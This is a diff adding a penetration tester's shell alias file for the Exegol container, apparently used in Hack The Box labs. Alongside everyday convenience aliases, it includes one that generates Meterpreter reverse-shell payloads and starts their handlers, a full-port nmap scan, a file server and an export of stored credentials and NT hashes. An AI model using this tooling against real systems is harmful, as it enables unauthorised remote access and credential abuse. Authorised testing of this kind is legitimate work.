@@ -1,0 +1,105 @@
+# Config file dedicated to the user's personal aliases shared between all exegol containers
+alias local_ip='(){
+    if [[ -z "${HTB}" ]]; then
+        ifconfig ens33 | grep "inet " | awk "{print \$2}"
+    else
+        ifconfig tun0 | grep "inet " | awk "{print \$2}"
+    fi
+}'
+alias http-server='(){
+    GREEN="\033[1;32m";
+    NO_COLOR="\033[0m";
+    password=$(openssl rand -base64 14);
+    echo "Password is: ${GREEN}$password${NO_COLOR}";
+    echo "URL: ${GREEN}https://$(local_ip)/${NO_COLOR}";
+    tmpfile=$(mktemp /tmp/updog.XXXXXX);
+    updog --ssl --port 443 --password $password --directory /workspace/web 2> $tmpfile;
+    rm $tmpfile;
+}'
+alias xclip="xclip -i -sel p -f | xclip -i -sel c"
+alias grep_ens33='ifconfig ens33 | grep "inet " | awk "{print \$2}"'
+alias grep_eth0='ifconfig eth0 | grep "inet " | awk "{print \$2}"'
+alias grep_tun0='ifconfig tun0 | grep "inet " | awk "{print \$2}"'
+alias ens33='grep_ens33 | tr -d "\n" | xclip'
+alias eth0='grep_eth0 | tr -d "\n" | xclip'
+alias tun0='grep_tun0 | tr -d "\n" | xclip'
+alias add-host="echo $1 $2 >> /etc/hosts"
+alias cat="bat -p -P"
+alias pcat="bat"
+alias nmap-classic='(){
+    mkdir -p /workspace/loot/$1/nmap/
+    nmap -v -sV -p- -oA /workspace/loot/$1/nmap/tcp_default_$1 $1;
+}'
+alias l="eza --icons=always -algh"
+alias ll="eza --icons=always -algh"
+alias ls="eza --icons=always -algh"
+alias obsidian="obsidian --no-sandbox &> /dev/null &"
+alias firefox="firefox &> /dev/null &"
+alias ff="firefox"
+alias burpsuite="/usr/lib/jvm/java-21-openjdk/bin/java -jar -Xmx4g /opt/tools/BurpSuiteCommunity/BurpSuiteCommunity.jar &> /dev/null &"
+alias msf_handlers="() {
+    cat > /root/.msf4/msf_handlers.rc << EOF
+    use payload/windows/x64/meterpreter/reverse_tcp
+    set LPORT 4445
+    set LHOST tun0
+    generate -f exe -o resources/windows/msf.exe
+    to_handler
+
+    use payload/windows/meterpreter/reverse_tcp
+    set LPORT 4446
+    set LHOST tun0
+    generate -f exe -o resources/windows/msf_32.exe
+    to_handler
+
+    use payload/windows/x64/meterpreter/reverse_https
+    set LPORT 4447
+    set LHOST tun0
+    generate -f exe -o resources/windows/msf_https.exe
+    to_handler
+
+    use payload/windows/meterpreter/reverse_https
+    set LPORT 4448
+    set LHOST tun0
+    generate -f exe -o resources/windows/msf_32_https.exe
+    to_handler
+
+    use payload/linux/x64/meterpreter/reverse_tcp
+    set LPORT 4449
+    set LHOST tun0
+    generate -f elf -o resources/linux/msf.elf
+    to_handler
+
+    use payload/linux/x86/meterpreter/reverse_tcp
+    set LPORT 4450
+    set LHOST tun0
+    generate -f elf -o resources/linux/msf_32.elf
+    to_handler
+
+    use payload/linux/x64/meterpreter_reverse_https
+    set LPORT 4451
+    set LHOST tun0
+    generate -f elf -o resources/linux/msf_https.elf
+    to_handler
+
+    use payload/linux/x86/meterpreter_reverse_https
+    set LPORT 4452
+    set LHOST tun0
+    generate -f elf -o resources/linux/msf_32_https.elf
+    to_handler
+    EOF
+
+    msfconsole -r /root/.msf4/msf_handlers.rc
+}"
+alias dbhosts='(){
+	HOSTS=$(dbassets tui hosts);
+	export IP=$( echo "$HOSTS" | sed "1q;d");
+	export TARGET=$( echo "$HOSTS" | sed "1q;d");
+	export HOSTNAME=$( echo "$HOSTS" | sed "2q;d");
+}'
+alias dbcreds='(){
+	CREDS=$(dbassets tui creds);
+	export USER=$( echo "$CREDS" | sed "1q;d");
+	export PASSWORD=$( echo "$CREDS" | sed "2q;d");
+	export NT_HASH=$( echo "$CREDS" | sed "3q;d");
+	export DOMAIN=$( echo "$CREDS" | sed "4q;d");
+}'
